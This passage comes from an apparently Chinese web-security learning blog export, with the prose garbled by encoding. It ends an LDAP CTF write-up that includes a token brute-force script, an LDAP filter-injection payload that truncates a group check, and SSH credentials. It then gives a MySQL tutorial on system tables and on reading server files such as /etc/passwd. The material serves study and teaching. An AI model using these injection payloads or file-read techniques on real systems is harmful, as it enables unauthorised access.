class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p>
<p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯éœ€è¦åˆ æ‰æœ€åçš„ä¸€ä¸ª9ï¼Œæ‰€ä»¥æœ€åçš„tokenå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure>
<p>æ¥ç€ç”¨stokenå·¥å…·å¯¼å…¥token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p>
<p>ç”ŸæˆOTP</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p>
<p>æˆåŠŸç™»å½•åï¼Œè·³è½¬åˆ°<code>page.php</code>é¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p>
<p>Damn itâ€¦æç¤ºæˆ‘ä»¬<code>ldapuser</code>æƒé™ä¸å¤Ÿä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p>
<ul>
<li>
<p>å¯¹<code>group</code>å±æ€§è¿›è¡Œæ³¨å…¥ï¼Œå³æŠŠåé¢groupå±æ€§çš„filteræˆªæ–­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(pager&#x3D;&lt;token&gt;)</span><br><span class="line">		(uid&#x3D;ldapuser)))%00</span><br><span class="line">	)</span><br><span class="line">	(|</span><br><span class="line">		(group&#x3D;root)</span><br><span class="line">		(group&#x3D;adm)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ä½¿ç”¨<code>*</code>é€šé…ç¬¦ä½œä¸ºç”¨æˆ·åç™»å½•</p>
</li>
</ul>
<p>è¿™é‡Œæ¼”ç¤ºä¸€ä¸‹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œpayloadç›´æ¥æ”¾åˆ°burpä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p>
<p>å†å»æ‰§è¡Œlså‘½ä»¤</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p>
<p>è¯»å–page.phpæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p>
<p>SSHç™»å½•ï¼š<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨å­¦ä¹ </tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™å’ŒHashå¯†ç çˆ†ç ´</title>
    <url>/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™å’ŒHashå¯†ç çˆ†ç ´">Webå®‰å…¨å­¦ä¹ ä¹‹MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™å’ŒHashå¯†ç çˆ†ç ´</h1>
<h2 id="ä»»åŠ¡ç›®æ ‡">ä»»åŠ¡ç›®æ ‡</h2>
<ol>
<li>å­¦ä¹ æ•°æ®åº“ç³»ç»Ÿè¡¨çš„åŠŸèƒ½ï¼Œå¦‚ä½•åˆ©ç”¨SQLè¯­å¥æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåã€å†…å®¹ä»¥åŠå½“å‰ç”¨æˆ·ç­‰åŸºæœ¬ä¿¡æ¯ï¼›</li>
<li>å¦‚ä½•åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶ï¼Œéœ€è¦ä»€ä¹ˆæ ·çš„æ¡ä»¶æ‰å¯ä»¥è¯»å†™ï¼›</li>
<li>æ‰©å±•ï¼šæŸ¥è¯¢ç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼Œå¹¶ä½¿ç”¨hashcatæ¥å¯¹è·å–çš„hashè¿›è¡Œæš´åŠ›ç ´è§£ã€‚</li>
</ol>
<h2 id="0x01-MySQLç³»ç»Ÿè¡¨">0x01 MySQLç³»ç»Ÿè¡¨</h2>
<h3 id="ä¸€ã€information-schema">ä¸€ã€information_schema</h3>
<p><strong>æ•°æ®åº“å…ƒæ•°æ®ï¼š</strong></p>
<p>å…ƒæ•°æ®(meta data)â€”â€”â€œdata about dataâ€ å…³äºæ•°æ®çš„æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç»“æ„åŒ–æ•°æ®ï¼ˆå¦‚å­˜å‚¨åœ¨æ•°æ®åº“é‡Œçš„æ•°æ®ï¼Œè§„å®šäº†å­—æ®µçš„é•¿åº¦ã€ç±»å‹ç­‰ï¼‰ã€‚æ‰€ä»¥metadataå°±æ˜¯æè¿°æ•°æ®çš„æ•°æ®ï¼Œåœ¨MySQLä¸­å°±æ˜¯æè¿°databaseçš„æ•°æ®ã€‚æœ‰å“ªäº›æ•°æ®åº“ã€æ¯ä¸ªè¡¨æœ‰å“ªäº›è¡¨ã€è¡¨æœ‰å¤šå°‘å­—æ®µã€å­—æ®µæ˜¯ä»€ä¹ˆç±»å‹ç­‰ç­‰ï¼Œè¿™æ ·çš„æ•°æ®å°±æ˜¯æ•°æ®åº“çš„å…ƒæ•°æ®ã€‚</p>
<p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç§°<code>information_schema</code>æ˜¯ä¸€ä¸ª<strong>å…ƒæ•°æ®åº“</strong>ã€‚å®ƒå°±åƒç‰©ä¸šå…¬å¸çš„ä¿¡æ¯åº“ï¼Œå¯¹ç®¡ç†çš„æ¯æ ‹å¤§å¦æœ‰å¤šå°‘ç”µæ¢¯ã€ç”µæ¢¯å‹å·ã€æ¯ä¸ªæˆ¿é—´çš„é•¿å®½é«˜ç­‰ç­‰äº†å¦‚æŒ‡æŒã€‚</p>
<ol>
<li>
<h5 id="SCHEMATA">SCHEMATA</h5>
<p>æä¾›æ•°æ®åº“ä¿¡æ¯ï¼Œæœ‰å“ªäº›æ•°æ®åº“ï¼Œå­—ç¬¦é›†æ˜¯GBKè¿˜æ˜¯UTF-8ç­‰ç­‰ã€‚</p>
<p>æ‰€æœ‰å­—æ®µåï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62uv0t1q0j20kp03ot97.jpg" alt=""></p>
<p>å…¶ä¸­æŸä¸€æ¡æ•°æ®ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62uxo6ljvj20nw01d0so.jpg" alt=""></p>
<p><strong>å‘½ä»¤<code>SHOW DATABASES;</code>çš„ç»“æœå–è‡ªæ­¤è¡¨</strong></p>
</li>
<li>
<h5 id="TABLES">TABLES</h5>
<p>æä¾›è¡¨çš„ä¿¡æ¯ï¼Œæ•°æ®åº“æœ‰å“ªäº›è¡¨ï¼Œæ˜¯ä»€ä¹ˆå­˜å‚¨å¼•æ“ç­‰ç­‰ã€‚</p>
<p>æ‰€æœ‰å­—æ®µåï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62v12v0n0j20jj0ct76r.jpg" alt=""></p>
<p>å¸¸ç”¨å­—æ®µåŒ…å«ï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µå</th>
<th>å«ä¹‰</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>TABLE_SCHEMA</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>è¡¨å</td>
<td></td>
</tr>
<tr>
<td>TABLE_TYPE</td>
<td>è¡¨çš„ç±»å‹</td>
<td></td>
</tr>
<tr>
<td>ENGINE</td>
<td>å­˜å‚¨å¼•æ“</td>
<td></td>
</tr>
<tr>
<td>CREATE_TIME</td>
<td>å»ºè¡¨æ—¶é—´</td>
<td></td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­æŸå‡ æ¡è®°å½•ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62v61aw7vj20mw03x0td.jpg" alt=""></p>
<p><strong>å‘½ä»¤<code>SHOW TABLES;</code>çš„ç»“æœå–è‡ªæ­¤è¡¨</strong></p>
</li>
<li>
<h5 id="COLUMNS">COLUMNS</h5>
<p>æä¾›å­—æ®µçš„ä¿¡æ¯ï¼Œæœ‰å“ªäº›å­—æ®µå­—æ®µç±»å‹æ˜¯ä»€ä¹ˆç­‰ç­‰ã€‚</p>
<p>æ‰€æœ‰å­—æ®µåï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/TjK7MfrFC8zOUun.png" alt=""></p>
<p>å¸¸ç”¨å­—æ®µåï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µå</th>
<th>å«ä¹‰</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHEMA_NAME</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>è¡¨å</td>
<td></td>
</tr>
<tr>
<td>COLUMN_NAME</td>
<td>å­—æ®µå</td>
<td></td>
</tr>
<tr>
<td>COLUMN_TYPE</td>
<td>å­—æ®µç±»å‹</td>
<td>å¦‚int(10),varchar(250)</td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­æŸå‡ æ¡è®°å½•ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/EPrSgVZfpLx1TN7.png" alt=""></p>
<p><strong>ç­‰åŒå‘½ä»¤ï¼š<code>SHOW COLUMNS</code> æˆ–è€… <code>desc learnSQL.customers</code> çœ‹empè¡¨çš„å…·ä½“å­—æ®µã€‚</strong></p>
</li>
<li>
<h5 id="STATISTICS">STATISTICS</h5>
<p>è¿™å¼ è¡¨çš„å•è¯æ˜¯ç»Ÿè®¡çš„æ„æ€ï¼Œä½†æ˜¯å´æ˜¯ç´¢å¼•çš„ä¿¡æ¯ã€‚</p>
<blockquote>
<p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1218728442198976">ä»€ä¹ˆæ˜¯ç´¢å¼•</a></p>
</blockquote>
<p>æ‰€æœ‰å­—æ®µåï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62vhu74ggj20ib0a0768.jpg" alt=""></p>
<table>
<thead>
<tr>
<th>å­—æ®µå</th>
<th>å«ä¹‰</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHEMA_NAME</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>è¡¨å</td>
<td></td>
</tr>
<tr>
<td>INDEX_SCHEMA</td>
<td>ä¹Ÿæ˜¯æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>INDEX_NAME</td>
<td>ç´¢å¼•å</td>
<td></td>
</tr>
<tr>
<td>COLUMN_NAME</td>
<td>å­—æ®µå</td>
<td></td>
</tr>
<tr>
<td>INDEX_TYPE</td>
<td>ç´¢å¼•ç±»å‹</td>
<td>ä¸€èˆ¬æ˜¯B-Tree</td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­å‡ æ¡è®°å½•ï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/6wPdHmi3ylEFJ5t.png" alt=""></p>
<p><strong>ç­‰åŒäºå‘½ä»¤ï¼š<code>SHOW INDEX;</code></strong></p>
</li>
<li>
<h5 id="TABLE-CONSTRAINTS">TABLE_CONSTRAINTS</h5>
<p>æä¾›çº¦æŸæƒ…å†µï¼Œæˆ‘ä»¬æƒ³çœ‹çœ‹è¡¨æœ‰å“ªäº›çº¦æŸï¼Ÿçº¦æŸæŒ‡çš„æ˜¯å”¯ä¸€æ€§çº¦æŸã€ä¸»é”®çº¦æŸã€å¤–é”®çº¦æŸã€‚</p>
<p>æ‰€æœ‰å­—æ®µåï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xqyr7lzj20kq0430td.jpg" alt=""></p>
<p>å¸¸ç”¨å­—æ®µåï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µå</th>
<th>å«ä¹‰</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONSTRAINT_SCHEMA</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>CONSTRAINT_NAME</td>
<td>çº¦æŸå</td>
<td></td>
</tr>
<tr>
<td>TABLE_SCHEMA</td>
<td>ä¹Ÿæ˜¯æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>è¡¨å</td>
<td></td>
</tr>
<tr>
<td>CONSTRAINT_TYPE</td>
<td>çº¦æŸç±»å‹</td>
<td>UNIQUEã€PRIMARY KEYã€FOREIGN KEY</td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­å‡ æ¡è®°å½•ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xt8hqe4j20qc07c3zm.jpg" alt=""></p>
<blockquote>
<p>å”¯ä¸€çº¦æŸå’Œä¸»é”®çº¦æŸï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„ç´¢å¼•ä¸­ä¸€æ ·å¯ä»¥æŸ¥åˆ°</p>
</blockquote>
</li>
<li>
<h5 id="KEY-COLUMN-USAGE">KEY_COLUMN_USAGE</h5>
<p>æœ‰STATISTICSå’ŒTABLE_CONSTRAINTSè¡¨ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦KEY_COLUMN_USAGEï¼Ÿ<br>
å› ä¸ºå¤–é”®æ—¶æ²¡æœ‰æŒ‡å‡ºå‚è€ƒçš„æ˜¯å“ªå¼ è¡¨çš„å“ªä¸ªå­—æ®µï¼</p>
<p>æ‰€æœ‰å­—æ®µï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xvqbu0dj20my07lmys.jpg" alt=""></p>
<p>å¸¸ç”¨å­—æ®µï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µå</th>
<th>å«ä¹‰</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONSTRAINT_SCHEMA</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>CONSTRAINT_NAME</td>
<td>çº¦æŸå</td>
<td>PRIMARYæˆ–åˆ—åæˆ–å¤–é”®å</td>
</tr>
<tr>
<td>TABLE_SCHEMA</td>
<td>ä¹Ÿæ˜¯æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>è¡¨å</td>
<td></td>
</tr>
<tr>
<td>COLUMN_NAME</td>
<td>åˆ—å</td>
<td></td>
</tr>
<tr>
<td>REFERENCED_TABLE_SCHEMA</td>
<td>å‚è€ƒçš„æ•°æ®åº“</td>
<td></td>
</tr>
<tr>
<td>REFERENCED_TABLE_NAME</td>
<td>å‚è€ƒçš„è¡¨</td>
<td></td>
</tr>
<tr>
<td>REFERENCED_COLUMN_NAME</td>
<td>å‚è€ƒçš„åˆ—</td>
<td></td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­å‡ æ¡è®°å½•ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xzsvazsj20z107z0uc.jpg" alt=""></p>
<p>ç›¸æ¯”å‰é¢ä¸¤ä¸ªï¼ŒKEY_COLUMN_USAGEè¿™ä¸ªè¡¨çš„ä¿¡æ¯æ˜¯æœ€å…¨çš„ã€‚åŒ…æ‹¬ä¸»é”®ã€å¤–é”®ã€å”¯ä¸€çº¦æŸã€‚</p>
</li>
<li>
<h5 id="VIEWS">VIEWS</h5>
<p>æŸ¥è¯¢æ•°æ®åº“ä¸‹æ‰€æœ‰çš„è§†å›¾ã€‚</p>
<p>æ‰€æœ‰å­—æ®µåï¼š</p>
<p><img src="https://i.loli.net/2019/09/17/197OPxmJczE8I3e.png" alt=""></p>
<p>å¸¸ç”¨å­—æ®µåï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µå</th>
<th>å«ä¹‰</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>TABLE_SCHEMA</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>è¡¨å</td>
<td></td>
</tr>
<tr>
<td>VIEW_DEFINITION</td>
<td>è§†å›¾å®šä¹‰è¯­å¥</td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<h5 id="å…¶ä»–éƒ¨åˆ†è¡¨">å…¶ä»–éƒ¨åˆ†è¡¨</h5>
<ul>
<li><strong>ENGINES</strong>ï¼šåˆ—ä¸¾äº†å½“å‰æ•°æ®åº“å¯¹InnoDBã€MEMORYã€MyISAMç­‰å„ç§å­˜å‚¨å¼•æ“çš„æ”¯æŒæƒ…å†µã€‚ç­‰åŒ<code>show ENGINES</code></li>
<li><strong>GLOBAL_VARIABLES</strong>ï¼šæœåŠ¡å™¨å˜é‡è®¾ç½®ï¼Œä¸€äº›å¼€å…³å’Œè®¾ç½®ã€‚ç­‰åŒå‘½ä»¤<code>show global variables</code>ã€‚é™¤äº†globalè¿˜æœ‰sessionã€‚</li>
<li><strong>PLUGINS</strong>ï¼šMySQLçš„æ’ä»¶åˆ—è¡¨ã€‚å¯ä»¥çœ‹åˆ°å­˜å‚¨å¼•æ“InnoDBç”šè‡³binlogéƒ½æ˜¯æ’ä»¶ï¼binlogæ˜¯å¼ºåˆ¶åŠ è½½çš„ï¼ŒInnoDBæ˜¯é»˜è®¤æ‰“å¼€çš„ã€‚ç­‰åŒå‘½ä»¤<code>show PLUGINS</code></li>
<li><strong>PROCESSLIST</strong>ï¼šæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„çº¿ç¨‹ï¼æ¯”å¦‚æˆ‘æŸ¥è¿™ä¸ªè¡¨ï¼Œå°±çœ‹åˆ°ä¸€ä¸ªæŸ¥è¯¢çš„çº¿ç¨‹ã€‚ç­‰åŒå‘½ä»¤<code>show full processlist</code></li>
</ul>
</li>
</ol>
<h3 id="äºŒã€Performance-schema">äºŒã€Performance_schema</h3>
<p>ä¸»è¦ç”¨äºæ”¶é›†æ•°æ®åº“æœåŠ¡å™¨æ€§èƒ½å‚æ•°ã€‚å¹¶ä¸”åº“é‡Œè¡¨çš„å­˜å‚¨å¼•æ“å‡ä¸ºPERFORMANCE_SCHEMAï¼Œè€Œç”¨æˆ·æ˜¯ä¸èƒ½åˆ›å»ºå­˜å‚¨å¼•æ“ä¸ºPERFORMANCE_SCHEMAçš„è¡¨ã€‚MySQL5.7é»˜è®¤æ˜¯å¼€å¯çš„ã€‚</p>
<p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/zhoujinyi/p/5236705.html">Performance_schema</a></p>
<h3 id="ä¸‰ã€mysql">ä¸‰ã€mysql</h3>
<p>mysqlçš„æ ¸å¿ƒæ•°æ®åº“ï¼Œç±»ä¼¼äºsql serverä¸­çš„masterè¡¨ï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰mysqlè‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚(å¸¸ç”¨çš„ï¼Œåœ¨mysql.userè¡¨ä¸­ä¿®æ”¹rootç”¨æˆ·çš„å¯†ç )ã€‚</p>
<blockquote>
<p>å¦‚ä½•åˆ©ç”¨SQLè¯­å¥æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåã€å†…å®¹ä»¥åŠå½“å‰ç”¨æˆ·ç­‰åŸºæœ¬ä¿¡æ¯</p>
<ul>
<li>æŸ¥è¯¢åº“åï¼š<code>SELECT schema_name FROM infomation_schema.schemata;</code></li>
<li>æŸ¥è¯¢è¡¨åï¼š<code>SELECT table_name FROM information_schema.tables WHERE table_schema='test'</code>;</li>
<li>æŸ¥è¯¢å­—æ®µåï¼š<code>SELECT column_name FROM information_schema.columns WHERE table_name='col'</code>;</li>
<li>æŸ¥è¯¢è®°å½•ï¼š<code>SELECT * FORM test.col;</code></li>
</ul>
</blockquote>
<h2 id="0x02-è¯»å†™æ–‡ä»¶">0x02 è¯»å†™æ–‡ä»¶</h2>
<h3 id="ä¸€ã€åˆ©ç”¨æ•°æ®åº“è¯»å–æ–‡ä»¶">ä¸€ã€åˆ©ç”¨æ•°æ®åº“è¯»å–æ–‡ä»¶</h3>
<ol>
<li>
<h5 id="ä½¿ç”¨systemå‘½ä»¤">ä½¿ç”¨systemå‘½ä»¤</h5>
<ul>
<li>
<p>æŸ¥çœ‹æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; system cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:110:116:user <span class="keyword">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:112:117::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:114:119::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/<span class="literal">false</span></span><br><span class="line">geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/<span class="literal">false</span></span><br><span class="line">gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/<span class="literal">false</span></span><br><span class="line">ca0y1h:x:1000:1000:ca0y1h,,,:/home/ca0y1h:/bin/bash</span><br><span class="line">mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æ‰§è¡Œå‘½ä»¤</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63nt6f27lj20jp092q4h.jpg" alt=""></p>
</li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>è¯¥æ–¹æ³•åªèƒ½åœ¨æœ¬åœ°ä½¿ç”¨ï¼Œè¿œç¨‹è¿æ¥æ—¶æ— æ³•ä½¿ç”¨system</li>
<li>æ— æ³•è¶Šæƒä½¿ç”¨</li>
</ul>
</li>
<li>
<h5 id="load-file-ä¸load-data-file">load_file()ä¸load data file</h5>
<p>load_file()ä¸load data fileè¯»å–æ–‡ä»¶çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼šæ–°å»ºä¸€ä¸ªè¡¨ï¼Œè¯»å–æ–‡ä»¶ä¸ºå­—ç¬¦ä¸²å½¢å¼æ’å…¥è¡¨ä¸­åè¯»å–è¡¨ä¸­çš„æ•°æ®ã€‚</p>
<p>ä½¿ç”¨load_file()å’Œload data infile()å‡½æ•°æ—¶ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li><code>secure_file_priv</code> ä¸ä¸º NULLï¼Œä½¿ç”¨ <code>select @@secure_file_priv</code>æŸ¥çœ‹å…¶å€¼ï¼Œå€¼ä¸ä¸ºç©ºå­—ç¬¦ä¸²æ—¶ï¼Œåªèƒ½ä½¿ç”¨è¯¥ç›®å½•è¿›è¡Œæ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œ è¯¥å€¼çš„è®¾ç½®è§[é™„å½•](<a href="https://bingslient.github.io/2019/08/16/MySQL">https://bingslient.github.io/2019/08/16/MySQL</a> æ•°æ®åº“ç³»ç»Ÿè¡¨çš„åˆ©ç”¨/#é™„å½•)ï¼›</li>
<li>å½“å‰æ•°æ®åº“ç”¨æˆ·å…·æœ‰ <code>FILE</code> æƒé™ï¼Œä½¿ç”¨ <code>show grants</code>æŸ¥çœ‹ï¼›</li>
<li>ç³»ç»Ÿç”¨æˆ· <code>mysql</code> å¯¹è¯¥æ–‡ä»¶å¯è¯»ï¼ˆè¦è€ƒè™‘ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œåœ¨Ubuntu-18.04ä½¿ç”¨ MySQL æ—¶é»˜è®¤çš„ç³»ç»Ÿç”¨æˆ·æ˜¯ <code>mysql</code>ï¼›</li>
<li>è¯»å–æ–‡ä»¶çš„å¤§å°å°äº <code>max_allowed_packet</code>ï¼Œä½¿ç”¨ <code>select @@max_allowed_packet</code>æŸ¥çœ‹ï¼›</li>
<li>æ–‡ä»¶å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚</li>
</ul>
<p>å¦‚æœä¸Šè¿°ä»»ä¸€æ¡ä»¶ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› <code>NULL</code> å€¼ã€‚</p>
